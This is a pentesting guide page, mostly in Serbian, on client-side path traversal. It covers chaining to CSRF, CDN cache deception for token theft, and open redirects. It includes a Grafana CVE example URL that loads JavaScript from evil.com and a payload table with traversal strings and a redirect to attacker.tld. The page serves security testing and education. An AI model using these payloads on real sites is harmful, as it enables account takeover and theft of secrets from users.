# Client Side Path Traversal

{{#include ../banners/hacktricks-training.md}}

## Osnovne informacije

A client side path traversal događa se kada možete da **manipulišete putanjom URL-a** koja će biti **poslata korisniku da je poseti na legitiman način** ili koju će korisnik na neki način biti **primoran da poseti npr. putem JS-a ili CSS-a**. CSPT is also known as On-Site Request Forgery (OSRF) zato što vam omogućava da prisilite pregledač žrtve da zakači proizvoljne putanje na istom origin-u koristeći njihove cookies, JWT-ove ili mTLS sertifikate.

Tipični izvori (podatci kojima upravljate):

- Route parameters koji se konkateniraju u `fetch()` ili XHR putanje (React Router, Next.js dynamic routes, Vue router params, Angular `ActivatedRoute`).
- Stored values (profile slugs, document IDs) koji se interpoliraju u putanje unutar background job-ova, service workera ili WebSocket URL-ova.
- UI gadgets (download/export buttons, image galleries) koji dodaju fragmente kontrolisane od strane korisnika ili ekstenzije fajla na API endpoint-e pre nego što se request pošalje.

Tipične destinacije (gde traversal završava):

- Frontend API wrappers koji prethode `/api/` ili `/proxy/` i automatski ponovo koriste auth headers.
- `history.pushState` / `router.navigate` helper-i koji rekonstruišu URL-ove kasnije tokom hydration-a.
- `<link>`/`<style>`/`@import` izjave generisane od strane CMS sadržaja ili feature-flag payload-a.

### Uobičajeni uticaji i lanci

- **CSPT ➜ CSRF/OSRF**: otmičite autentifikovane `POST/PUT/DELETE` pozive bekapsiranjem iz nameravane resursne putanje, zatim ponovnim ulaskom u osetljive endpoint-e (password reset, payment approval, access revocation). Kombinujte sa [CSRF](csrf-cross-site-request-forgery.md) checklist-om za eskalaciju.
- **CSPT ➜ cache deception / poisoning**: poslužite attacker-controlled JSON sa javnih CDN ključeva i reprodukujte ga neautentifikovano. Pogledajte [Cache Poisoning and Cache Deception](cache-deception/README.md).
- **CSPT ➜ Open Redirect ➜ XSS/SSRF**: traversal dospeva na open redirect endpoint, koji onda preusmerava na infrastrukturu napadača koja servira zlonamerni JS ili SSRF payload-e. Niz povežite sa [Open Redirect](open-redirect.md) zloupotrebama.

### Primeri nalaza

- In [**this writeup**](https://erasec.be/blog/client-side-path-manipulation/), bilo je moguće **promeniti invite URL** tako da bi na kraju **otkazao karticu**.
- In [**this writeup**](https://mr-medi.github.io/research/2022/11/04/practical-client-side-path-traversal-attacks.html), bilo je moguće kombinovati **client side path traversal via CSS** (moglo se promeniti odakle se CSS resurs učitavao) sa **open redirect** da bi se CSS učitao sa **domena pod kontrolom napadača**.
- In [**this writeup**](https://blog.doyensec.com/2024/07/02/cspt2csrf.html), može se videti tehnika kako zloupotrebiti CSPT **za izvođenje CSRF napada**. To se radi praćenjem **svih podataka** koje napadač može kontrolisati (URL path, parameters, fragment, podaci injektovani u DB...) **i sinkova** gde ti podaci završavaju (zahtevi koji se izvršavaju).
- Check [**this browser extension**](https://addons.mozilla.org/en-US/firefox/addon/eval-villain/) da biste to pratili.
- Check this [**CSPT playground**](https://github.com/doyensec/CSPTPlayground) da probate tehniku.
- Check [**this tutorial**](https://blog.doyensec.com/2024/12/03/cspt-with-eval-villain.html) kako koristiti browser extension u playground-u.

## CSPT-assisted web cache poisoning/deception

CSPT može biti povezan sa extension-based CDN caching-om da bi se eksfiltrirao osetljivi JSON leaked by authenticated API calls:

- Frontend konkatenira korisnički kontrolisan input u API putanju i prilaže authentication headers u fetch/XHR.
- Injektovanjem dot-segments (../) možete preusmeriti autentifikovani zahtev na drugi endpoint na istom origin-u.
- Ako je taj endpoint (ili varijanta putanje sa statički izgledajućim sufiksom kao .css) keširan od strane CDN-a bez variranja po auth headers, autentifikovani odgovor žrtve može biti sačuvan pod javnim cache ključem i dohvaćen od strane bilo koga.

Kratki recept:

1) Pronađite SPA kod koji gradi API URL-ove iz path parameters dok šalje auth headers.
2) Identifikujte osetljive endpoint-e i testirajte statičke sufikse (.css, .js, .jpg, .json) da vidite da li CDN menja na Cache-Control: public/max-age i X-Cache: Hit dok vraća JSON.
3) Namamite žrtvu na URL koji injektuje traversal u SPA parametar tako da autentifikovani fetch pogodi cacheable path varijantu (na primer, ../../../v1/token.css).
4) Pročitajte isti URL anonimno da biste dobili keširani secret (token → ATO).

See details and mitigations in the Cache Deception page: [Cache Poisoning and Cache Deception](cache-deception/README.md).

## Radni tok za otkrivanje i alati

### Pasivno otkrivanje pomoću intercepting proxies

- **Correlate sources/sinks automatically**: the [CSPT Burp extension](https://github.com/doyensec/CSPTBurpExtension) parsira vašu proxy history, grupiše parametre koji se kasnije reflektuju unutar putanja drugih zahteva, i može ponovo izdati proof-of-concept URL-ove sa canary token-ima da potvrdi eksploatabilne traversale. Nakon učitavanja JAR-a, podesite `Source Scope` na client parameters (npr. `id`, `slug`) i `Sink Methods` na `GET, POST, DELETE` tako da ekstenzija istakne opasne request buildere. Možete eksportovati sve sumnjive izvore sa ugrađenim canary-em da ih validirate u bulk-u.
- **Look for double-URL-decoding**: dok pretražujete sa Burp-om ili ZAP-om, pazite na `/api/%252e%252e/` obrasce koji se normalizuju od strane frontenda pre nego što dođu do mreže—oni se obično pojavljuju kao base64-encoded JSON bodies koji referenciraju route state i lako se previdi bez automatizovanog skenera.

### Instrumentovanje SPA sinkova ručno

Ubacivanje kratkog snippet-a u DevTools pomaže da se otkriju skriveni traversali dok interagujete sa UI-jem:
```javascript
(() => {
const origFetch = window.fetch;
window.fetch = async function (input, init) {
if (typeof input === "string" && /\.\.\//.test(input)) {
console.log("[CSPT candidate]", input, init?.method || "GET");
debugger;
}
return origFetch.apply(this, arguments);
};
})();
```
- Dodajte slične wrapper-e oko `XMLHttpRequest.prototype.open`, `history.pushState` i framework-specific router-e (npr. `next/router`). Posmatranje `init.credentials === "include"` brzo sužava zahteve koji nose session cookies.
- Ako aplikacija čuva routing hints u IndexedDB/localStorage, izmenite te unose sa traversal payload-ima i reload-ujte — mutirani state se često reinjektuje u zahteve pre-hydration.

### Lab & payload rehearsal

- Podignite CSPT Playground pomoću `docker compose up` i vežbajte lančanje traversal ➜ CSRF ➜ stored XSS tokova bez diranja cilja. Reproduciranje strukture routera cilja lokalno olakšava pravljenje deljivih PoC-ova.
- Održavajte scratchpad uspešnih dot-segment varijacija (`..;/`, `%2e%2e/`, `%2e./%2e/`, UTF-8 homoglyphs) i suffix trikova (`.css`, `.json`, `;` matrix params) koje ste zabeležili tokom recon-a kako biste ih mogli brzo replay-ovati kada se pojavi novi sink.

## Recent case studies (2025)

- **Grafana OSS CVE-2025-4123/6023 (v11.5.0+)** – A traversal gadget inside `/public/plugins/` let attackers smuggle `../../` into the plugin asset loader, chain it with Grafana’s open redirect, and force victims to load attacker-controlled plugin bundles. When anonymous dashboards were enabled, a crafted URL such as `https://grafana.example.com/public/plugins/../../../../..//evil.com/poc/module.js` resulted in the browser executing remote JavaScript; if the Image Renderer plugin was installed, the same primitive could be flipped into SSRF by redirecting rendering requests toward internal hosts. Always test plugin asset paths, anonymous dashboards, and renderer endpoints together because a single traversal often gives you both XSS and SSRF angles.

## Payload cookbook

| Cilj | Payload pattern | Napomene |
| --- | --- | --- |
| Hit sibling API under same origin | `?doc=../../v1/admin/users` | Radi kada routeri jednostavno konkateniraju `/${doc}`. Dodajte `.json` ako CDN samo kešira statički izgledajuće asset-e. |
| Force SPA to follow open redirect | `?next=..%2f..%2f..%2flogin/callback/%3FreturnUrl=https://attacker.tld/x` | Kombinujte sa trusted redirectors navedenim u target’s codebase. Chain with [Open Redirect](open-redirect.md). |
| Abuse extension-based CDN cache | `?file=../../v1/token.css` | CDN može tretirati `.css` kao statičko i keširati tajne vraćene kao JSON. |
| CSRF via verb change | `?action=../../payments/approve/.json&_method=POST` | Neki routeri prihvataju `_method` overrides; sparite sa traversal-om da biste re-targetovali destruktivne endpoint-e. |

## References

- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Grafana CVE-2025-4123 Chained Path Traversal + Open Redirect Analysis](https://www.cve.news/cve-2025-4123/)
- [Doyensec CSPT Burp Extension](https://github.com/doyensec/CSPTBurpExtension)

{{#include ../banners/hacktricks-training.md}}
